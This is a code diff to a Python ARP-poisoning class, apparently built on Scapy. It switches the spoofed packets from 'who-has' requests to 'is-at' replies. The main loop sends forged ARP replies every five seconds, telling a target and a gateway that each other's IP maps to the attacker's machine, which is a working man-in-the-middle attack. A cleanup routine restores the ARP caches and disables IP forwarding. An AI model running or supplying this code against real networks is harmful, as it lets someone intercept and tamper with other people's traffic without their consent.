@@ -30,8 +30,8 @@ class ARPPoison(threading.Thread):
 		self.running = True
 		while self.running:
 			#hwdst is the actual recepient of the ARP packet, src is where the requests want to go, dst is where they end up
-			net.send(net.ARP(op="who-has", hwdst=self.machines["target"].mac, pdst=self.machines["target"].ip, psrc=self.machines["gateway"].ip), verbose=VERBOSITY)
-			net.send(net.ARP(op="who-has", hwdst=self.machines["gateway"].mac, pdst=self.machines["gateway"].ip, psrc=self.machines["target"].ip), verbose=VERBOSITY)
+			net.send(net.ARP(op="is-at", hwdst=self.machines["target"].mac, pdst=self.machines["target"].ip, psrc=self.machines["gateway"].ip), verbose=VERBOSITY)
+			net.send(net.ARP(op="is-at", hwdst=self.machines["gateway"].mac, pdst=self.machines["gateway"].ip, psrc=self.machines["target"].ip), verbose=VERBOSITY)
 			time.sleep(5) #typically kept in the ARP cache for 60s
 		self.__del__()
 
@@ -40,8 +40,8 @@ class ARPPoison(threading.Thread):
 			return
 		self.running = False
 		if self.stdout: print("Restoring ARP...")
-		net.send(net.ARP(op="who-has", hwdst="ff:ff:ff:ff:ff:ff", pdst=self.machines["target"].ip, hwsrc=self.machines["gateway"].mac, psrc=self.machines["gateway"].ip), verbose=VERBOSITY)
-		net.send(net.ARP(op="who-has", hwdst="ff:ff:ff:ff:ff:ff", pdst=self.machines["gateway"].ip, hwsrc=self.machines["target"].mac, psrc=self.machines["target"].ip), verbose=VERBOSITY)
+		net.send(net.ARP(op="is-at", hwdst="ff:ff:ff:ff:ff:ff", pdst=self.machines["target"].ip, hwsrc=self.machines["gateway"].mac, psrc=self.machines["gateway"].ip), verbose=VERBOSITY)
+		net.send(net.ARP(op="is-at", hwdst="ff:ff:ff:ff:ff:ff", pdst=self.machines["gateway"].ip, hwsrc=self.machines["target"].mac, psrc=self.machines["target"].ip), verbose=VERBOSITY)
 
 		if self.stdout: print("Disabling IP Forward...")
 		with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
